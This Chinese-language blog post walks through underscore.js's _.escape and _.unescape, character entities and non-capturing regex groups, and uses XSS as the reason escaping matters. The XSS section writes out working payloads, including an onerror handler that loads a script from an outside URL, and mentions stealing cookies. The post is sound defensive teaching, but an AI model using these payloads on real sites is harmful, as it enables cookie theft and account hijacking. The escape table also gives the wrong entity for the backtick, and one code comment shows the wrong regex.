---
author: "冴羽"
title: "underscore 系列之字符实体与 _escape"
date: 2018-03-29
description: "underscore 提供了 _escape 函数，用于转义 HTML 字符串，替换 &, , , , ', 和 ` 字符为字符实体。 比如我把这个页面的地址修改为：wwwexamplecomuserhtml?name=scriptalert(1)scr…"
tags: ["HTML","前端","Underscore.js","浏览器中文技术社区","前端开发社区","前端技术交流","前端框架教程","JavaScript 学习资源","CSS 技巧与最佳实践","HTML5 最新动态","前端工程师职业发展","开源前端项目","前端技术趋势"]
ShowReadingTime: "阅读2分钟"
weight: 1
selfDefined:"likes:16,comments:5,collects:11,views:2375,"
---
前言
--

underscore 提供了 `_.escape` 函数，用于转义 HTML 字符串，替换 &, <, >, ", ', 和 \` 字符为字符实体。

```
_.escape('Curly, Larry & Moe');
=> "Curly, Larry &amp; Moe"
```

underscore 同样提供了 `_.unescape` 函数，功能与 `_.escape` 相反：

```
_.unescape('Curly, Larry &amp; Moe');
=> "Curly, Larry & Moe"
```

XSS 攻击
------

可是我们为什么需要转义 HTML 呢？

举个例子，一个个人中心页的地址为：`www.example.com/user.html?name=kevin`，我们希望从网址中取出用户的名称，然后将其显示在页面中，使用 JavaScript，我们可以这样做：

```
/**
* 该函数用于取出网址参数
*/
    function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

var name = getQueryString('name');
document.getElementById("username").innerHTML = name;
```

如果被一个同样懂技术的人发现的话，那么他可能会动点“坏心思”：

比如我把这个页面的地址修改为：`www.example.com/user.html?name=<script>alert(1)</script>`。

就相当于:

```
document.getElementById("username").innerHTML = '<script>alert(1)</script>';
```

会有什么效果呢？

结果是什么也没有发生……

这是因为:

> 根据 W3C 规范，script 标签中所指的脚本仅在浏览器第一次加载页面时对其进行解析并执行其中的脚本代码，所以通过 innerHTML 方法动态插入到页面中的 script 标签中的脚本代码在所有浏览器中默认情况下均不能被执行。

千万不要以为这样就安全了……

你把地址改成 `www.example.com/user.html?name=<img src=@ onerror=alert(1)>` 的话，就相当于：

```
document.getElementById("d1").innerHTML="<img src=@ onerror=alert(1)>"
```

此时立刻就弹窗了 1。

也许你会想，不就是弹窗个 1 吗？还能怎么样？能写多少代码？

那我把地址改成 `www.example.com/user.html?name=<img src=@ onerror='var s=document.createElement("script");s.src="https://mqyqingfeng.github.io/demo/js/alert.js";document.body.appendChild(s);' />` 呢？

就相当于：

```
document.getElementById("username").innerHTML = "<img src=@ onerror='var s=document.createElement(\"script\");s.src=\"https://mqyqingfeng.github.io/demo/js/alert.js\";document.body.appendChild(s);' />";
```

整理下其中 onerror 的代码：

```
var s = document.createElement("script");
s.src = "https://mqyqingfeng.github.io/demo/js/alert.js";
document.body.appendChild(s);
```

代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口……

总之，很危险。

为了防止这种情况的发生，我们可以将网址上的值取到后，进行一个特殊处理，再赋值给 DOM 的 innerHTML。

字符实体
----

问题是怎么进行转义呢？而这就要谈到字符实体的概念了。

在 HTML 中，某些字符是预留的。比如说在 HTML 中不能使用小于号（<）和大于号（>），因为浏览器会误认为它们是标签。

如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。

字符实体有两种形式：

1.  `&entity_name;`
2.  `&#entity_number;`。

比如说我们要显示小于号，我们可以这样写：`&lt;` 或 `&#60`;

值得一提的是，使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（但是对实体数字的支持却很好）。

也许你会好奇，为什么 `<` 的字符实体是 `&#60` 呢？这是怎么进行计算的呢？

其实很简单，就是取字符的 unicode 值，以 `&#` 开头接十进制数字 或者以 `&#x`开头接十六进制数字。举个例子：

```
var num = '<'.charCodeAt(0); // 60
num.toString(10) // '60'
num.toString(16) // '3c'
```

我们可以以 `&#60;` 或者 `&#x3c;` 在 HTML 中表示出 `<`。

不信你可以写这样一段 HTML，显示的效果都是 `<`：

```
<div>&lt;</div>
<div>&#60;</div>
<div>&#x3c;</div>
```

再举个例子：以字符 '喵' 为例：

```
var num = '喵'.charCodeAt(0); // 21941
num.toString(10) // '21941'
num.toString(16) // '55b5'
```

在 HTML 中，我们就可以用 `&#21941;` 或者 `&#x55b5` 表示`喵`，不过“喵”并不具有实体名。

转义
--

我们的应对方式就是将取得的值中的特殊字符转为字符实体。

举个例子，当页面地址是 `www.example.com/user.html?name=<strong>123</strong>`时，我们通过 getQueryString 取得 name 的值：

```
var name = getQueryString('name'); // <strong>123</strong>
```

如果我们直接：

```
document.getElementById("username").innerHTML = name;
```

如我们所知，使用 innerHTML 会解析内容字符串，并且改变元素的 HMTL 内容，最终，从样式上，我们会看到一个加粗的 123。

如果我们转义，将 `<strong>123</strong>` 中的 `<` 和 `>` 转为实体字符，即 `&lt;strong&gt;123&lt;/strong&gt;`，我们再设置 innerHTML，浏览器就不会将其解释为标签，而是一段字符，最终会直接显示 `<strong>123</strong>`，这样就避免了潜在的危险。

思考
--

那么问题来了，我们具体要转义哪些字符呢？

想想我们之所以要转义 `<` 和 `>` ，是因为浏览器会将其认为是一个标签的开始或结束，所以要转义的字符一定是浏览器会特殊对待的字符，那还有什么字符会被特殊对待的呢？(O\_o)??

`&` 是一个，因为浏览器会认为 `&` 是一个字符实体的开始，如果你输入了 `&lt;`，浏览器会将其解释为 `<`，但是当 `&lt;` 是作为用户输入的值时，应该仅仅是显示用户输入的值，而不是将其解释为一个 `<`。

`'` 和 `"` 也要注意，举个例子：

服务器端渲染的代码为：

```
    function render (input) {
    return '<input type="name" value="' + input + '">'
}
```

input 的值如果直接来自于用户的输入，用户可以输入 `"> <script>alert(1)</script>`，最终渲染的 HTML 代码就变成了：

```
<input type="name" value=""> <script>alert(1)</script>">
```

结果又是一次 XSS 攻击……

最后还有一个是反引号 \`，在 IE 低版本中(≤ 8)，反引号可以用于关闭标签：

```
<img src="x` `<script>alert(1)</script>"` `>
```

所以我们最终确定的要转义的字符为：&, <, >, ", ', 和 \`。转义对应的值为：

```
& --> &amp;
< --> &lt;
> --> &gt;
" --> &quot;
' --> &#x27;
` --> &#60;

```

值得注意的是：单引号和反引号使用是实体数字、而其他使用的是实体名称，这主要是从兼容性的角度考虑的，有的浏览器并不能很好的支持单引号和反引号的实体名称。

\_.escape
---------

那么具体我们该如何实现转义呢？我们直接看一个简单的实现：

```
var _ = {};

    var escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '`': '&#x60;'
    };
    
        _.escape = function(string) {
            var escaper = function(match) {
            return escapeMap[match];
            };
            // 使用非捕获性分组
            var source = '(?:' + Object.keys(escapeMap).join('|') + ')';
            console.log(source) // (?:&|<|>|"|'|`)
            var testRegexp = RegExp(source);
            var replaceRegexp = RegExp(source, 'g');
            
            string = string == null ? '' : '' + string;
            return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
        }
```

实现的思路很简单，构造一个正则表达式，先判断是否能匹配到，如果能匹配到，就执行 replace，根据 escapeMap 将特殊字符进行替换，如果不能匹配，说明不需要转义，直接返回原字符串。

值得一提的是，我们在代码中打印了构造出的正则表达式为：

```
(?:&|<|>|"|'|`)

```

其中的 `?:` 是个什么意思？没有这个 `?:` 就不可以匹配吗？我们接着往下看。

非捕获分组
-----

`(?:pattern)` 表示非捕获分组，即会匹配 pattern 但不获取匹配结果，不进行存储供以后使用。

我们来看个例子：

```
    function replacer(match, p1, p2, p3) {
    // match，表示匹配的子串 abc12345#$*%
    // p1，第 1 个括号匹配的字符串 abc
    // p2，第 2 个括号匹配的字符串 12345
    // p3，第 3 个括号匹配的字符串 #$*%
    return [p1, p2, p3].join(' - ');
}
var newString = 'abc12345#$*%'.replace(/([^\d]*)(\d*)([^\w]*)/, replacer); // abc - 12345 - #$*%
```

现在我们给第一个括号中的表达式加上 `?:`，表示第一个括号中的内容不需要储存结果：

```
    function replacer(match, p1, p2) {
    // match，表示匹配的子串 abc12345#$*%
    // p1，现在匹配的是字符串 12345
    // p1，现在匹配的是字符串 #$*%
    return [p1, p2].join(' - ');
}
var newString = 'abc12345#$*%'.replace(/(?:[^\d]*)(\d*)([^\w]*)/, replacer); // 12345 - #$*%
```

在 `_.escape` 函数中，即使不使用 `?:` 也不会影响匹配结果，只是使用 `?:` 性能会更高一点。

反转义
---

我们使用了 `_.escape` 将指定字符转为字符实体，我们还需要一个方法将字符实体转义回来。

写法与 `_.unescape` 类似：

```
var _ = {};

    var unescapeMap = {
    '&amp;': '&',
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&#x27;': "'",
    '&#x60;': '`'
    };
    
        _.unescape = function(string) {
            var escaper = function(match) {
            return unescapeMap[match];
            };
            // 使用非捕获性分组
            var source = '(?:' + Object.keys(unescapeMap).join('|') + ')';
            console.log(source) // (?:&|<|>|"|'|`)
            var testRegexp = RegExp(source);
            var replaceRegexp = RegExp(source, 'g');
            
            string = string == null ? '' : '' + string;
            return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
        }
        
        console.log(_.unescape('Curly, Larry &amp; Moe')) // Curly, Larry & Moe
```

抽象
--

你会不会觉得 `_.escape` 与 `_.unescape` 的代码实在是太像了，以至于让人感觉很冗余呢？

那么我们又该如何优化呢？

我们可以先写一个 `_.invert` 函数，将 escapeMap 传入的时候，可以得到 unescapeMap，然后我们再根据传入的 map (escapeMap 或者 unescapeMap) 不同，返回不同的函数。

实现的方式很简单，直接看代码：

```
/**
* 返回一个object副本，使其键（keys）和值（values）对换。
* _.invert({a: "b"});
* => {b: "a"};
*/
    _.invert = function(obj) {
    var result = {};
    var keys = Object.keys(obj);
        for (var i = 0, length = keys.length; i < length; i++) {
        result[obj[keys[i]]] = keys[i];
    }
    return result;
    };
    
        var escapeMap = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '`': '&#x60;'
        };
        var unescapeMap = _.invert(escapeMap);
        
            var createEscaper = function(map) {
                var escaper = function(match) {
                return map[match];
                };
                // 使用非捕获性分组
                var source = '(?:' + _.keys(map).join('|') + ')';
                var testRegexp = RegExp(source);
                var replaceRegexp = RegExp(source, 'g');
                    return function(string) {
                    string = string == null ? '' : '' + string;
                    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
                    };
                    };
                    
                    _.escape = createEscaper(escapeMap);
                    _.unescape = createEscaper(unescapeMap);
```

underscore 系列
-------------

underscore 系列目录地址：[github.com/mqyqingfeng…](https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmqyqingfeng%2FBlog "https://github.com/mqyqingfeng/Blog")。

underscore 系列预计写八篇左右，重点介绍 underscore 中的代码架构、链式调用、内部函数、模板引擎等内容，旨在帮助大家阅读源码，以及写出自己的 undercore。

如果有错误或者不严谨的地方，请务必给予指正，十分感谢。如果喜欢或者有所启发，欢迎 star，对作者也是一种鼓励。